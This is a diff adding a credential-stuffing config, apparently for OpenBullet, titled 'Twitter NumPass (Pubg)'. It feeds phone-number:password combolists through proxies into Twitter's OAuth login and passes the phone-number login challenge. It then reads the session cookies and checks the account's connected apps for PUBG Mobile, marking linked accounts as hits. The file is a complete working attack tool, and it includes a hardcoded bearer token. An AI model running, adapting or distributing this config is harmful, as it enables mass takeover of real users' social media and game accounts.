@@ -1,0 +1,145 @@
+[SETTINGS]
+{
+  "Name": "Twitter NumPass (Pubg)",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-07T09:56:37.6088251+04:00",
+  "AdditionalInfo": "Use Num:Pass Combolist",
+  "RequiredPlugins": [],
+  "Author": "🔥 combo2021🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Default",
+  "AllowedWordlist2": "Credentials",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.twitter.com/oauth/authorize" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.twitter.com" 
+  HEADER "content-length: 314" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "origin: https://api.twitter.com" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 11; Redmi Note 9S Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "x-requested-with: com.tencent.ig" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "referer: https://api.twitter.com/oauth" 
+  HEADER "accept-encoding: gzip, deflate" 
+  HEADER "accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7" 
+
+PARSE "<SOURCE>" LR "input type=\"hidden\" value=\"" "\"" -> VAR "AT" 
+
+REQUEST POST "https://api.twitter.com/oauth/authorize" 
+  CONTENT "authenticity_token=<AT>&redirect_after_login=https%3A%2F%2Fapi.twitter.com%2Foauth%2Fauthenticate%3Foauth_token%3DhT5iJQAAAAAA4RWYAAABfOfUKXI&oauth_token=hT5iJQAAAAAA4RWYAAABfOfUKXI&session%5Busername_or_email%5D=<USER>&session%5Bpassword%5D=<PASS>&ui_metrics=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.twitter.com" 
+  HEADER "content-length: 314" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "origin: https://api.twitter.com" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 11; Redmi Note 9S Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "x-requested-with: com.tencent.ig" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "referer: https://api.twitter.com/oauth" 
+  HEADER "accept-encoding: gzip, deflate" 
+  HEADER "accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Your phone number ends in" 
+    KEY "logged-in" 
+  KEYCHAIN Failure OR 
+    KEY "We could not verify your credentials" 
+    KEY "The email and password you entered did not match our records" 
+    KEY "We found more than one account with that phone number" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "In order to protect your account from suspicious activity" 
+    KEY "This account is suspended." 
+
+#chall PARSE "<ADDRESS>" LR "" "" -> VAR "call_url" 
+
+#challenge_id PARSE "<call_url>" LR "challenge_id=" "&redirect" -> VAR "challenge_id" 
+
+#enc_user_id PARSE "<call_url>" LR "enc_user_id=" "&" -> VAR "enc_user_id" 
+
+#redirect_after_login_verification PARSE "<call_url>" LR "redirect_after_login_verification=" "" -> VAR "redirect_after_login_verification" 
+
+REQUEST POST "https://twitter.com/account/login_challenge" 
+  CONTENT "authenticity_token=<AT>&challenge_id=<challenge_id>&enc_user_id=<enc_user_id>&challenge_type=RetypePhoneNumber&platform=web&redirect_after_login=<redirect_after_login_verification>&remember_me=&challenge_response=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "https://twitter.com/settings/connected_apps" ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#tok2 PARSE "<COOKIES(auth_token)>" LR "" "" -> VAR "TT" 
+
+#tok3 PARSE "<COOKIES(ct0)>" LR "" "" -> VAR "CT" 
+
+REQUEST GET "https://twitter.com/i/api/1.1/oauth/list.json" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA" 
+  HEADER "cookie: auth_token=<TT>; ct0=<CT>" 
+  HEADER "referer: https://twitter.com/settings/connected_apps" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36" 
+  HEADER "x-csrf-token: <CT>" 
+  HEADER "x-twitter-active-user: yes" 
+  HEADER "x-twitter-auth-type: OAuth2Session" 
+  HEADER "x-twitter-client-language: en" 
+
+PARSE "<SOURCE>" LR "\",\"name\":\"" "\",\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Apps" 
+
+FUNCTION Constant "🆅🅸🅰 🆃🆆🅸🆃🆃🅴🆁" -> CAP "🅿🆄🅱🅶 🅼🅾🅱🅸🅻🅴 🅻🅾🅶🅸🅽 " 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "PUBGMOBILE" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<SOURCE>" DoesNotContain "PUBGMOBILE" 
+
